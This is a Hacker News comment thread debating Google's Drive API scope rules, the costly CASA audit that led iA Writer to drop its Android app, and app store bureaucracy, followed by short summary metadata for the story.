(before getting discovered) means you better turn a profit fast - and if you can't, there's not much point getting that full storage scope reply sidewndr46 16 hours agorootparentIf that's the case then a $700 bond would be sufficient reply Gigachad 16 hours agorootparentWho is paying the security auditor then? reply sidewndr46 15 hours agorootparentThat's the point, the security auditor is providing any service other than being a barrier. reply therein 12 hours agorootparentDo you think this may allow us to reintegrate the security auditor back into the productive workforce after a brief period of adjustment? reply croes 18 hours agoparentprevPerhaps Google should have pointed this out in its review instead of just recommending read-only access. reply reichenstein 11 hours agorootparentWell, it's not like we don't know about the default file picker. If we'd switch our customers to that clunky, buggy piece of brittle UX bricolage, they start throwing stones. And you know what: They'd be right. They usually are right. They just don't know or care what it costs to build that they don't want to pay for. And understandably, since everything else in Google world comes completely free of charge. Some experts here seem to think that “It’s great that Google takes security seriously. I don’t want just any app getting access to my Drive.” Guys... You think this is air you're breathing? CASA isn’t real security. It’s a very badly played security theater. There are plenty of holes, MI CASA SU CASA, that real hackers can use to steal your selfies and credit card info. You still think we’re not informed enough? We never wanted access to Google Drive. We don’t care about your Google Drive or anyone’s Drive at all. We don’t have, want, or ever asked for access to your files. And don’t start with, “But you could be hackers!” We’re not. Google has our entire history—7 years with them, 14 years building apps, and 20 years as a company. They have our code, user feedback, passports, phone numbers, bank info, and confidential documents. But they still pass the security theatre burden onto us, making us pay KPMG for audits. Not because it makes things safer. It's so they can lean back, do nothing, and then lift both hands and then point fingers in case things go wrong. That scales nicely. You know what is a much better way to care about safety? A human mind that knows, checks and cares. Oh, that doesn't scale? Okay, so let's increase bureaucracy. Yeah, bureaucracy will make things safer. Safety by bureaucracy was always the best great hacker barrier. Or is it the opposite? Bureaucracy makes you calculable. If I were a hacker, I'd welcome bureaucracy. reply anal_reactor 11 hours agorootparentBecause of security reasons, my web browser cannot write to \"Downloads\", but \"Downloads/a\" works. Because of security reasons, my file manager cannot access \"Android/obb\" and I need to use a trick with the \"Files\" app. In order to improve user experience, the option to directly mount the SD card via USB has been removed. Now I need to physically remove it from the phone because the Android's default way of handling things simply doesn't work when you have more than a handful of files. BTW SD cards suck on Android, but when you connect them to the cheapest Chinese USB reader and to your PC, then they're magically 10x faster. It's clear to me that Google pushes business decisions under the disguise of \"improvements\". I think that removing the audio jack was the symbol of Google moving away from creating a good OS to monetizing their OS. I really wish there was a viable alternative to Android that I could install on any phone. reply MrDresden 13 hours agorootparentprevI'm going to hazard a guess that you haven't been involved in many direct interactions with the Google review process. They are rarely if ever precise or very factual. reply throwaway314155 17 hours agoparentprev> I only read the first part of the article Don't you think it makes sense to read the whole article before dismissing it so completely? This forum should really have a rule to discourage shallow dismissals to somewhat counteract the negative effects of the whole \"don't talk about RTFA\" rule. reply hn_throwaway_99 3 hours agorootparentI didn't \"dismiss it so completely\". It was clear to me from the first half I read that the author completely misunderstood and was unaware of the Drive API scope changes that Google made. There is nothing I wrote that would have been contradicted by the rest of the blog post. reply reichenstein 2 hours agorootparentThe definition of a well informed, happy, modern man: He reads a couple of lines and goes, \"Yep, I know how this article ends. I'm right, he's wrong.\" Then he watches the first half of a game, switches off the TV, pumps his fist, and says, \"My team WINS again.\" Writes the match report, gets in the shower, soaps himself up, and walks out, unrinsed, fully lathered, super clean. reply mvdtnz 14 hours agorootparentprevNot only does this forum have no such rule, you are in fact in violation of the website's guidelines for pointing out that this chap didn't read the article. Which is bananas. reply throwaway314155 1 hour agorootparentYeah it's maddening. reply threeseed 19 hours agoparentprevDoesn't that mean that the app wouldn't be able to edit a document created elsewhere. Including documents created by their own web or desktop client. And it's odd that Google thinks that writing to files is significantly worse than reading. What benefit does a hacker have to update your private photos or bank details versus reading them. reply thatguy0900 19 hours agorootparentThe user can use a file picker to select individual files as well. reply fsckboy 16 hours agorootparent>The user can use a file picker to select individual files as well. the top comment on this thread says: It lets an app read and write only files the app owns (or read files a user picks through the file picker control). which would not include writing picker files. Are you saying picker files could be written? reply tadfisher 1 hour agorootparentYou do not need to request any sort of OS permission or Drive API access to read or write Drive files that are selected using the system document picker. You do need to specify that you want a writable file when you open the picker. The system will grant your app write permission for that file URI only. reply threeseed 18 hours agorootparentprevSo then the app can't have Recent Files functionality. Or open the last file the user was editing as it may have been edited elsewhere. Seems pretty unworkable for a text editor. reply NavinF 18 hours agorootparentOnly if you absolutely insist on creating your own special snowflake file picker UI instead of using the OS file picker reply IanCal 18 hours agorootparentprevI don't think that's true, doesn't the file picker have recent files in it? > Or open the last file the user was editing as it may have been edited elsewhere. When is this a particular use case? Auto open a file I opened elsewhere? reply Gigachad 15 hours agorootparentThe iOS file picker does have a recent files tab and it seems to be the first one that opens. reply crazygringo 18 hours agorootparentprevThose seem pretty minor, and are you sure Google doesn't allow a way for permission on the file to persist? Even if it doesn't, you can access recent files from the Drive file picker. reply cyberax 16 hours agorootparentprev> So then the app can't have Recent Files functionality. Yeah, this is an issue. Google really needs to fix this. And there are multiple ways to do that! They can remember that a file was opened by the app earlier, and let it access again for a reasonable period. They can also allow delegating access on a directory level instead of a binary all-or-nothing approach. reply rerdavies 13 hours agorootparentAndroid DOES remember permissions for folders that you have opened previously through the picker (although the app does have to code for that); and you can reuse the URLs for files that you have received through the picker, as long as the permissions are still intact. (You can lose them if the app is used infrequently). Life would be so much easier if the Android File Picker UI weren't so incredibly awful. Has to be the worst piece of UI design I have ever seen. Incredibly difficult to use even if you know exactly what you want. reply SSLy 19 hours agoparentprevit's a text editor. Users expect to edit files in any random directory they'll make on drive, not in the containment scope that doesn't work with users' writing habits. reply 0cf8612b2e1e 19 hours agorootparentFrom the description, the app launches an OS controlled file picker. Once the human picks a file, the app is given a file handle with read/write permissions. Any file is fair game to be used within the app, but the application does not get to know anything about the file system. reply layer8 18 hours agorootparentThis sounds like the user has to navigate to the file from the app’s file picker each time they want to open the file, instead of being able to open the file from the Files app. This would also mean that the app can’t maintain a “recent files” list (or bookmarks) for the user to be able to quickly reopen a previously opened file, because that wouldn’t be going through the file picker. reply tadfisher 1 hour agorootparentThat is not true; you can hang on to the content URI and metadata to present a Recent Files UI. You need to ask for a persisted write permission for the content URI. You can even use the ContentResolver to check the file's existence and update the metadata (including thumbnail). reply hn_throwaway_99 18 hours agorootparentprevI wouldn't want any text editor app to have full rights to my Google Drive. I literally recently implemented a similar feature (not for a text editor but for an app that needed to pull files from many different sources), and it's not that hard, i.e. giving easy access to local files and then using the picker control for \"Drive imports\". The problem here is the original app developer had full, willy-nilly Drive access, and when Google rightfully locked down this level of access (and, mind you, didn't prohibit - I've gone through the Drive restricted scope verification process and it's not as hard as this blog post is making it out to be), the developer didn't take the time to see what was necessary to comply. Again, I have no doubt Google could have given better instructions on how to migrate to the drive.file scope or how to use the restricted scopes. But Google has been warning about this for many years now, so seems like this dev just scrambled at the last minute. reply stickfigure 17 hours agorootparent> I wouldn't want any text editor app to have full rights to my Google Drive. What text editor do you use on your laptop/desktop/pc? reply Gigachad 15 hours agorootparentOn MacOS, apps like VSCode have to ask permission to read directories if they weren't opened via the OS file picker. So my text editor can not read my Google Drive folder unless I explicitly allow it to. reply hn_throwaway_99 17 hours agorootparentprevPrimarily vim or VSCode, why? reply klabb3 17 hours agorootparentParent means that your desktop OS is not sandboxed and your editor has permissions to read any file you have access to, including mounted Cloud Drives, as well as showing a custom file explorer (which both Vim and VSCode do, btw) and does not require special scoping on a file-by-file basis to happen in some OS controlled, confusing back-and-forth dance. The security model on mobile, despite being gate kept and sandboxed to an extreme, still has massive giant glaring problems with malware, phishing and tracking (although that’s more of a feature). To double down on this strategy, by whitelisting, reviewing, authorizing, auditing, and blessing entitlements in holy corporate water – shows an amusing incongruence in contrast with say Linux which by almost every metric is more secure despite none of that, and to a lesser extent, macOS and Windows. reply Gigachad 15 hours agorootparentLinux desktop is not secure at all. Basically anything you install can do anything without limitations. In a few minutes I could whip up a VSCode plugin that sends me your browser session storage and have access to all of your everything. It's getting a lot better with Flatpak, Wayland, and PipeWire, but the pieces are still being put in place for an actually secure Linux desktop that comes anywhere close to the security of MacOS and iOS. reply klabb3 7 hours agorootparent> In a few minutes I could whip up a VSCode plugin that sends me your browser session storage and have access to all of your everything. Yeah I know but I’m saying despite that Linux is more secure in practice. Most software is not distributed as some random VS code extension, but as FOSS projects and all the checks and balances of the distro maintainers. That’s who keeps you safe at night, and it works remarkably well. Capability permission in all glory but it’s not a panacea. What happens in practice is that an app asks for permission to your bank account and eternal soul, and then users say “well, I guess I need to if I want this Instagram filter” and there you go. So it’s not as easy as retrofitting sandboxing onto the OS. Neither am I claiming it’s easy to solve. What I am saying is the App Store model is largely security theatre. reply Shawnecy 13 hours agorootparentprev> Linux desktop is not secure at all. Basically anything you install can do anything without limitations. This is ridiculously false. reply Gigachad 12 hours agorootparentEvery traditional package manager I’ve seen installs programs as root and they can do basically everything including adding services to systemd as root, modifying configs in /etc for example. It’s only the newer stuff like flatpak that bring in some sanity to the installation process. reply ajross 18 hours agorootparentprevTo be blunt: how do you know it's not an exfiltration app that will suck down your entire Drive and upload it to their sponsor's ML training engine? Text editors are great, but hand-installed editors[1] running on the local filesystem of a developer-maintained personal device are a very different threat model than an app available to everyone in the Play Store. [1] And even then they tend strongly to be boosted by a large community of (usually) open source developers attesting to it, usually by inclusion in something like a \"Linux Distro\" which carries a strong promise of well-audited software. Emacs and VSCode and whatnot skate on reputation, basically, but the community tends to frown on \"here: download my new binary tool for all your editting needs!\". reply fragmede 17 hours agorootparentI like how ML training is the worst thing you can think of and not stealing your identity and bank account information and all your money or seeing nudes or something actually damaging that normal people care about. reply cudgy 8 hours agorootparentAre you assuming that the ML company does not sell its training data to scammers or others that will sell to scammers? reply ajross 16 hours agorootparentprevI was trying to be trendy and hip and avoid hyperbole. But yeah, that too. Also boring stuff like corporate espionage and malware distribution. reply notpushkin 19 hours agoparentprev> Create new Drive files, or modify existing files, that you open with an app or that the user shares with an app while using the Google Picker API or the app’s file picker. Yeah, this should do the trick. From the cursory look seems like there’s no Google Picker UI for Android though? Google actions are somewhat ridiculous here (they should audit iA’s app, not their cloud), but the reason is pretty solid IMO. If you choose an overly broad scope, be prepared for scrutiny. reply Gigachad 15 hours agorootparentYou don't need a google drive specific picker. Drive adds itself in to the OS file picker, on iOS at least. And that lets any app access any file without even using the drive api or having an api key. The key point is that iOS and Android control that access so the app can't open a file the user didn't select. If you want that functionality, you can do it easily for files the app created itself, or if you want access to literally everything without user oversight, you need a security audit. reply notpushkin 12 hours agorootparentIn some cases you might want to retain access to the file. I think the OS file picker doesn’t allow that while the Google Picker does. reply mvdtnz 14 hours agorootparentprevThis is the second time I have seen you in this thread talk about how the iOS picker behaves. This is irrelevant. We're not discussing iOS. reply notpushkin 12 hours agorootparentI’d expect something similar on Android actually – there is the relevant API at least. reply spencerchubb 19 hours agoparentprevyeah I think android's policy is pretty reasonable here. if you're gonna have read/write access to everything in my google drive, you should be scrutinized pretty heavily. reply StewardMcOy 19 hours agoparentprevStrong disagree. Part of my disagreement comes from the fact that the process is inconsistent and time-consuming from Google's end. If you read more of the article, you can get a glimpse of how poorly it's run. And iA have been lucky here. Some apps submit to Google for OAuth approval and get stuck waiting for approval for years. But another part comes from the fact that drive.file access is not enough for some apps, and iA Writer falls into that category. Some apps really do need full access. (But Google told them they only need read-only access, lol.) Additionally, having been though the CASA process, it has been pure security theater. No offense to the people working on it, because I'm sure they have good intentions, but letting developers run a python script on their app to self-report vulnerabilities really doesn't solve anything. I suspect this is why Google took away the free option and are requiring a review by a security lab. The problems with this is that Google only guarantees a minimum cost, not a maximum cost, and that not every company is in a position to let the lab Google has partnered with see their code. And finally, I'm skeptical at how much a security lab is going to find with a quick check on a small payment. And frankly, Google Drive access is not worth the cost. Even if it's $500/year in fees, + time working with the lab (which, as iA pointed out, can be a huge opportunity cost), in most cases, the kinds of apps that need full access won't suffer $500/year in damages by removing Google Drive support. And Google Drive doesn't exist in a vacuum. There are other cloud storage solutions out there. Amazon doesn't make developers jump through their ridiculous hoops to access the S3 API. reply notpushkin 18 hours agorootparent> But another part comes from the fact that drive.file access is not enough for some apps, and iA Writer falls into that category. How so? (I agree that the readonly category doesn’t work for iA, but drive.file should be fine IMO.) > Amazon doesn't make developers jump through their ridiculous hoops to access the S3 API. With S3, you only get access to your app’s data, not everything user has. If that’s what you want drive.file or drive.appfolder permissions are what you need: https://developers.google.com/drive/api/guides/api-specific-... reply StewardMcOy 16 hours agorootparent> How so? (I agree that the readonly category doesn’t work for iA, but drive.file should be fine IMO.) Arguably, I'm not as familiar with iA as I should be, having only tried it briefly a while ago, but IIRC it basically mounts your file store as if it were a filesystem and allows you to completely manage files. Add, rename, delete, etc. And it's not just limited to iA's App's data. Part of the sales point is to be able to go between iA and Google Docs. And it allows you to search for a string in every file in a folder. Sure, it has to download every file to do that, and that can be a bad idea, but it if you have a folder of 100 files, 100 KB each, that's reasonable. But with drive.file, what are you going to do? Show a picker for each of those 100 files? And this is for a native app. It would have to load up a web view to show the picker. > With S3, you only get access to your app’s data, not everything user has. This is incorrect. With the S3 API, you could implement the search every file in a folder feature I mentioned above, no pickers required. Just use ListObjects (or ListBucket) along with GetObject. And again, Google is locking this kind of access behind a CASA review, and while I don't want to insult anyone's intentions, CASA review is fairly useless. Even the paid option is more security theater than anything else. And it's a burden put on developers that other services don't require. reply notpushkin 12 hours agorootparent> IIRC it basically mounts your file store as if it were a filesystem and allows you to completely manage files. This is not something I’d want a text editor to do! (The search feature is cool though.) If the point really is to make an alternative UI to both Drive and Docs, this makes sense, but again, I wouldn’t expect that. > With the S3 API, you could implement the search every file in a folder feature This is useful! Not my point though. With the S3 API, you usually create one or multiple buckets per app – perhaps even one bucket per user. Your app manages those buckets, so it’s natural that it has access to the whole thing. (You can ask users to plug in their own S3 buckets, but that’s also not something I’d expect from iA.) With Google Drive API, you mount user’s own Drive storage. This includes all files in it, some created by other apps, some uploaded by the user directly. Your app doesn’t usually need access to everything I have in there. S3 and Drive are just two completely different products, for different people, with different API security models. You can use S3 as a personal storage space (I do actually, but with Backblaze), and perhaps you can make your app store file uploads on Dropbox for example but it’s not straightforward. > CASA review is fairly useless Absolutely. I’m just arguing about intentions actually – granular permissions are net good. The processes at Google are quite ridiculous indeed. reply MagerValp 11 hours agorootparent> This is not something I’d want a text editor to do! But this is exactly how it works in Sublime or VS Code or what have you on the desktop. You open a project folder and then you can click any file to edit, add new files, rename them, and so on. It's been decades since I last used a text editor where you had to open each file individually (CygnusEd!). reply StewardMcOy 4 hours agorootparentprev> With the S3 API, you usually create one or multiple buckets per app – perhaps even one bucket per user. Your app manages those buckets, so it’s natural that it has access to the whole thing. (You can ask users to plug in their own S3 buckets, but that’s also not something I’d expect from iA.) Then I think we have completely opposite expectations of what a native editor should do here. I don't want to use iA to create an app-specific folder for all of its files, I want to use it to edit all of my existing files in all of my buckets. Who organizes their files by app? Imagine if VS Code could only edit projects in a folder it created to manage files? What about Photoshop? Should I be forced to save images in the Photoshop folder and then move them to my VS Code folder? I would never \"create one or multiple buckets per app,\" because my life isn't app-centric, it's document-centric. On S3, I organize my buckets by project, or sometimes by client. On Docs, that's how I organize my folders. If I download a new editor, I expect it to be able to edit any and all of the files without fuss, whether they're on my local disk, on S3, or on Google Drive. If I'm running an editor, it really does need to \"access everything I have in there,\" including files, created by other apps or uploaded by the user directly. EDIT: I'm not trying to question the intentions of those who think apps that access all files should be more secure. But the current process is untenable for independent developers, and in my experience, does little to actually improve the security of the app. iA is correct to drop drive support rather than attempt to shoehorn their app into a scope it's not designed for or waste time and money jumping through these useless hoops. reply mgraczyk 18 hours agorootparentprevFWIW they don't allow developers to self verify any more (as of this year). reply StewardMcOy 16 hours agorootparentWhich is why I said > I suspect this is why Google took away the free option and are requiring a review by a security lab. reply phsource 19 hours agoprevWe've had to go through this process for the app I have, and it definitely was cumbersome and makes the process a huge pain. Fortunately, after a while Google often lets you switch to a Tier 1 assessment, which involves using various tools to analyze your code and make improvements without shelling out a ton of money. At the same time, Google is in a tough spot here. The files and documents in your Google Drive (or Gmail) are incredibly sensitive. One possible solution is using the https://www.googleapis.com/auth/drive.file OAuth scope, which only lets you access files a user has explicitly shared with the app. I'm curious if iA Writer has limitations that makes this a bad user experience, but from a user security point of view, I can see why I want the apps that get to see my whole Google Drive audited too. [1] https://developers.google.com/drive/api/guides/api-specific-... reply Gigachad 18 hours agoparentAs a user of Google drive, I’m so glad it works like this. I have a ton of random apps that store stuff in my drive that I don’t fully trust, and it’s very reassuring that they only have permission to read the files that they created. I’m certain that if the full drive access was easy to get, they would all use that as the path of least resistance. And some of those apps would be sucking all of my data out to some random server. reply kstrauser 17 hours agorootparentI'm very sympathetic to that approach. But I think it has to be tempered at least a little bit with reputation. iA has been making Writer for 12 years now and it's always been a premium, highly user-respecting app. If they can't get through that bureaucracy, it probably can't be done. Granted, past performance doesn't mean they'll be perfect forever. It's not a guarantee. It should carry some weight, though. I can't think of many devs I'd trust with my data as much as iA. Omni Group, I guess. Agile Tortoise. There's a set of devs who stake their business on their sterling reputations. It should be possible for that gang to at least contact a human to answer their questions. reply Gigachad 16 hours agorootparentIt's not clear why they even need full access to users drives without the users input. Drive offers plenty of apis that let you store and access files that don't require these hoops. There is no security audit required if you pick the scope that only lets you open files the app created. You can also let the user use the OS file picker to open any file. I get that it's a pain for them to rewrite the integration to use these new scopes, but it's ultimately a huge win that this free for all access has been locked down. reply Larrikin 17 hours agorootparentprevIt feels like a situation where we just need laws to make it illegal to do a data grab like this and apps in country's without those laws should get the scrutiny. I think a random phone app WOULD do that because there are no repercussions for doing so. Facebook, LinkedIn, and then late comers ruined the phone ecosystem by doing all the shady things they did when you wanted to do one simple useful thing. I should be able to grant contact information to an app so that it can connect me with my friends on the service. I should not have to worry about all of my contact information being harvested for spam and sold to anyone the company thinks they can make a buck from. But I also can't imagine using a program on my computer that was prevented from having full access to my file system if I wanted it to have it. MacOS slowly killing the system is making me considering switching to a different OS for the first time in over a decade reply Gigachad 16 hours agorootparentIt already is illegal to write malware that steals your files. But software is global. Anon individuals in shitty countries don't care about your countries privacy laws. So we get both privacy laws, and technical restrictions that put the user in control of their files. reply greiskul 18 hours agorootparentprevYup. And it needs to be something that has to be done regularly, either every time the app updates or on a fixed schedule. Otherwise you would get a similar ecosystem that happened with some browser extensions, where a benign developer goes, writes an useful app, gets the permissions for that and a user base, then some shady company comes and acquires the app and updates it to use the permission to suck up all data. Sure it's an annoying process for developers, but Google has to think of the user privacy when creating the policies around these kind of permissions. reply ghoomketu 18 hours agoprevRecently, there have been scam Android apps in India that request access to users’ contact lists. These apps then blackmail users by threatening to send deepfake videos to their contacts, falsely accusing them of heinous acts like rape. Tragically, some individuals have even committed suicide due to this blackmail(1). So dozens of people have actually killed themselves because they mistakenly gave a permission on their phone.. just let that sink in. Google is in a difficult position. On one hand, they need to protect user data with strict security measures. On the other hand, these measures can be seen as overly restrictive. It’s a delicate balance, and unfortunately, there’s no easy solution. (1) https://www.thequint.com/news/india/bbc-chinese-loan-app-doc... reply meiraleal 18 hours agoparentThe world would benefit of a better solution that is for the Indian Justice system deal with the issue. reply sunshowers 17 hours agorootparentPerhaps, but we must all play the cards we are dealt. reply Spivak 17 hours agorootparentprevOr you just put the burden on the developer who has a very high interest in jumping through hoops since money is on the other end. reply FredPret 19 hours agoprevIn short, Google bureacratized them almost to death over Google Drive access, and then offered up a solution where they pay KPMG for an annual audit. But the audit would cost them two months of revenue, every year. So: > So, as of today, we’re not just accepting our frozen-in-carbonite fate. We’re embracing it. We’re going to take the app offline. By making a native app, you're donating free developer time to the platform owner. If they're not making it worth it for you, screw them. reply Gigachad 18 hours agoparentTo some extent, if you can’t afford a yearly audit, you can’t afford unlimited access to users sensitive documents. It’s much like handling credit card data or toxic waste. Most people and small orgs should avoid it at all costs. Thankfully Google offers a lot of less risky permission scopes that don’t require audits. reply NavinF 17 hours agorootparentYeah that seems totally fair. How many users really intend to give full access to an app made by someone that can't afford $500/year? Most non-devs would be sketched out reply aftbit 19 hours agoprevI respect the \"fine we'll take our ball and go home then\" approach to put some actual pressure on Google. I do wonder if they could have just chosen to stop offering Google Drive support on Android and instead pivot to storing content on their own servers with a simple data export option, or using something like Dropbox instead. It really seems like this latest cloud compliance battle was just the straw that broke the camel's back, and the real problem is that the Android app wasn't earning that much money as it was, so this was a convenient time and reason to kill it. reply 1970-01-01 19 hours agoparentWhy do all android app roads always lead to Google's app store? Why not move everything to another app store, such as Amazon's? All the code, work, time, and other sacrifices aren't worth giving them a shot? https://en.wikipedia.org/wiki/List_of_Android_app_stores reply rvnx 18 hours agorootparentYou get a lot of organic installs from Google Play Store, and almost none from alternative stores like Huawei or Amazon Store. This is because it is where there is the traffic. reply Zak 19 hours agorootparentprevAsk Epic Games. The short answer is that you will not make very much money from your Android app if it isn't in Google's store. reply ajsnigrutin 19 hours agorootparentThat's because everyone is using the google store. If a critical mass of software moved to an , maybe even become cheaper (because that store only takes 20% instead of 30%), people would switch. It's like chat applications... if most of your friends are using MSN messenger, you'll be using it too... if most of them also use icq, and it's cheaper than MSN, and it also has two more friends that don't use MSN, you'll switch to icq. reply Gigachad 18 hours agorootparentUsers have basically no reason to move over because they have no problems with the play store. Apps only move over for their own business reasons like saving on fees or avoiding privacy restrictions. reply ajsnigrutin 18 hours agorootparent...or avoiding google fees for in app purchases. ...or avoiding freedom of speech limitations (telegram). etc. The problem is, that you now have to go to that services' site, download the apk there and then get promptet \"an update is available\", download, install, etc., with the benefits of a package management system. You have alternative stores like f-droid, but there are almost no apps there, that would make \"normal users\" install it... for now. Same for others. reply Gigachad 18 hours agorootparentThe fees can be avoided by making the subscription on the web ui and then continuing to use the main app. The speech restrictions maybe have some merit, but right now Telegram basically only restricts extreme hate speech / borderline terrorist content to mobile users. The majority of users don’t care to access this anyway. reply rerdavies 13 hours agorootparentWhich actually violates Google Play terms of service, and runs the risk of having your account and your apps permanently delisted. I ended up converting links to my Github sponsorship page to a page that accepts donations through Google Play over concerns about exactly this. reply ajsnigrutin 18 hours agorootparentprevTelegram restricts a lot of stuff on the play store version, be it piracy related or just basic news from eg. russian sources or any other country that the EU/US/google doesn't like. App downloaded directly from telegram.org doesn't have such limitations. Considering the pressures from EU, I guess they'll have to censor that too relatively soon... maybe even everything pro-trump. Sometimes you want other news sources than the bbc/cnn. reply s1artibartfast 18 hours agorootparentprevyou need a store where the cost to use it in parallel is so low that companies are willing to take the chance. One of those costs imposters and bad players using the alternative store. I would settle for apps proving the files for sideloading on their website, and the vast majority wont even do that. reply rerdavies 13 hours agorootparentprevI've tried a couple of alternate stores, including Amazon's store. Absolutely zero revenue. And insane amounts of paperwork. reply fidotron 18 hours agorootparentprevNot all stores are created equal. If you use non Play Store stores on a device with the Play Store you will get a lot more prompts constantly reminding you of how unsafe it is and how comfy and warm it was back on the Play Store. Google are damned if they do and damned if they don’t on that, but it is deserved, they have burned so much goodwill in the Android space. reply talldayo 18 hours agorootparent> If you use non Play Store stores on a device with the Play Store you will get a lot more prompts constantly reminding you of how unsafe it is and how comfy and warm it was back on the Play Store. I am an F-Droid user, and I have only ever seen this a single time, when I first enabled sideloading in a pop-up. Maybe it's only a Samsung thing, but I have never gotten a Play Store nag related to third-party software stores in my life. reply eddd-ddde 16 hours agorootparentCan confirm, only issue to me sometimes is managing updates. reply fidotron 18 hours agorootparentprevDo those fdroid installed apps auto update? reply sunshowers 17 hours agorootparentMany do these days, actually. reply talldayo 17 hours agorootparentprevAs of v1.19 and Android 12, yes. That's not a nag regardless. reply fidotron 8 hours agorootparentSo that change was in February 2024 and only for Android 12 and above which isCambridge Analytica scandal Would it be considered a scandal if happened in 2022. reply rammer 14 hours agoprevCasa approval is a necessary step, we have gone through that for one of our apps approval that requires Google drive write access. Yes you are essentially asking users to give a whole lot of information because giving access to Google drive technically also gives access to a lot of the Gmail attachments because people tend to save them in Google drive. You can't fault Google with being trying to be too careful. If you think this was painful try accessing the shopify marketplace. reply cageface 15 hours agoprevSupporting the play store is increasingly not worth the trouble. It's already questionable from a revenue standpoint and they're making it an ever more hostile place for all but the biggest corporate developers. reply ericcj 18 hours agoprevThey’re removing API access to Google Photos as well now the only “integration” is for other apps to open the Google Photos app https://news.ycombinator.com/item?id=41604241 reply crossroadsguy 18 hours agoprevI really would have expected an app like iA to not depend on either Google or Apple's sync - because both suck in their own rights. iCloud is just technically inferior by the way - I mean most of the time it's a coin toss on whether and how it works even for their own usage like iCloud Tabs, iCloud Messages and Photos and what not. As of now I try to avoid any app that is married to either Google (drive or whatever is the latest there) or Apple (iCloud) sync. Because my experience with these has been really inferior. Anyway that means I have to either use a Google a/c which I do not use anymore for personal needs or iCloud which is clearly inferior. Imho it's better to offer an e2ee custom server wherever you can (preferably on top of some open standard/spec). I am past \"but I would rather trust robustness of Google and Apple's backend\" after these 3-4 years. And I can completely relate to the pain of supporting all those Android models and their sub-models and their sub-sub-models. It used to be a real nightmare when I had to deal with that. ---------- Having said - I have felt the might of these big companies in a very small way recently. My Play Store account (which I kept for learning/testing purposes - sharing apps among friends etc) was terminated even though I fulfilled the criteria 2 days before the last date. No refund was provided either because I could not find out how to add a bank account and they didn't share even though I had asked them 3 weeks in advance for that info. I would ask \"how to add a bank account\" and they would reply with the same text \"… please add a bank account for refund…\" and I would again immediately reply asking \"..but how the hell I can add a bank account - there is no info on this in your docs and whatever I could find doesn't even apply because I can't see those settings in the first place\"… and they would respond with the exact same text again and again and again. I checked - I was indeed communicating with humans. After the last day I received the final response: \"…was deleted..requirement... T&C.. and there will be no further response\". That was it. reply kstrauser 16 hours agoparentAre you sure that's still true? iCloud use to have its issues, no doubt. I don't remember the last time I had to deal with any of that. It's been a couple years at least. reply crossroadsguy 15 hours agorootparentYes I am sure and it is still true. reply petee 19 hours agoprevFunny Google requires a phone and email for Play Store users to contact, yet most of the major apps contact email addresses are \"we dont read this; No Reply. But here is our crappy forum\" reply jhbadger 18 hours agoprevI'm (or was) a hobbyist programmer on Android. I have a handful of free apps but Google has made it so onerous to actually get things in the store these days. I've given up; it may be worth the time of a big software studio to handle all the busywork they make you do these days, but it certainly isn't for a hobbyist. Yes, I know Apple is supposed to be even worse, but Android was supposed to be the reasonable platform in regard to this nonsense. reply cecida 19 hours agoprevThere are few things more depressing than having to deal with companies like Accenture, EY, KPMG etc. It's a world of FUD, upsell, more consultants, nothing getting done, lots of slides, new \"junior senior Global Consultant for Microservices\" type stuff. They are literally a cancer on innovation and just getting things done. They destroy the ethos of a company through deliberate intransigence. reply fyrn_ 18 hours agoprevAI alwayd ahd a pretty major apple lean, and from the post's misunderstanding of google drive permissions (global vs file scopes), it's clear that is still true. About not to matter though since they are killing the android app. reply gnarbarian 13 hours agoprevProgressive Web App. you don't need app stores reply meiraleal 18 hours agoprevWow. This is unbelievable. I'm wondering about creating only a PWA or building Android + iOS apps and this article made me decide with going PWA-only, I'm not going to deal with this. The competition in the official app stores is so big that it is not really worth it anyway reply grumple 19 hours agoprevWe have a similar experience developing for android. They ask us to change things constantly, fill out endless paperwork, most of which is irrelevant to us (we have to verify a payments account for our free, ad free, no in app sales app). Every so often it's a random change to requirements around this permission or that, or more information needed for a security or data policy. reply f33d5173 18 hours agoprev> And before anyone says this is the price of an “open” OS—well, we don’t have this problem on Windows.5 Cue drum roll... reply throwawayffffas 19 hours agoprevJust move everything to your own storage instead of Google Drive. And maybe have your desktop or web app interface with Google drive. reply soup10 17 hours agoprevThis mirrors my experience with Android, ported a game, jumped through all the regulatory hoops, got in on the app store, then endless bureaucratic nonsense to keep it there. reply sorbusherra 19 hours agoprevSounds like Google has turned into Nokia. History repeats itself. reply jauntywundrkind 15 hours agoprevIt's a pity systems like remotestorage.io or Tim Berners-Lee's Solid hasn't gotten serious traction. Ideally there wouldn't even be Google Drive integration! Ideally we'd just have a mount on our devices that syncs. This is how I use Logseq, for example. It's a little weird and frustrating that mobile phones seem to lack virtual filesystem support (like FUSE), so the sync app in use is just rsyncing to local storage, basically, which is kind of fine, but it means there's no chance to have say my home movies collection available directly from my phone. This story isn't really one about Android or mobile, but the general beatdown on mobile really squaders what should be the most impressive expansive electronic device to have filled the world. reply FpUser 17 hours agoprev>\"In order to get our users full access to their Google Drive on their devices, we now needed to pass a yearly CASA (Cloud Application Security Assessment) audit. This requires hiring a third-party vendor like KPMG.\" This is just plain extortion. I am curious how much masqueraded kickbacks Google gets from those auditors. reply mvdtnz 14 hours agoprev [–] I don't know why anybody develops anything for these scumbag companies (Apple and Google). There's plenty of money to be made making software for the web. I have never written a single line of Android or iOS code and have had a very successful career so far. Supporting these companies is a choice. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "iA Writer's Android app development faced a significant challenge when Google changed its API policy, revoking access to Google Drive.",
      "Despite efforts to comply with new requirements, including rewriting privacy statements and passing security checks, Google only provided read-only access, which is unsuitable for a writing app.",
      "The need for a costly annual CASA audit further complicated matters, leading iA Writer to halt new features and updates for its Android app, focusing on other platforms and projects instead."
    ],
    "commentSummary": [
      "The Android app from ia.net is facing issues due to stringent security requirements imposed by Google on Drive API scopes, particularly the \"fully open\" read/write scopes.",
      "Google has introduced a less sensitive Drive API scope, 'drive.file', which allows apps to read and write only files they own or files selected by the user through a file picker, but the transition process has been unclear and problematic for developers.",
      "The security measures, including a $720 CASA lab assessment, aim to prevent malware but have been criticized as burdensome and ineffective, leading to frustration among developers."
    ],
    "points": 317,
    "commentCount": 138,
    "retryCount": 0,
    "time": 1727390345
  },
  {
    "id": 41670429,
    "title": "Maggie Smith has died",
    "originLink": "https://variety.com/2024/legit/news/maggie-smith-dead-harry-potter-1236157839/",
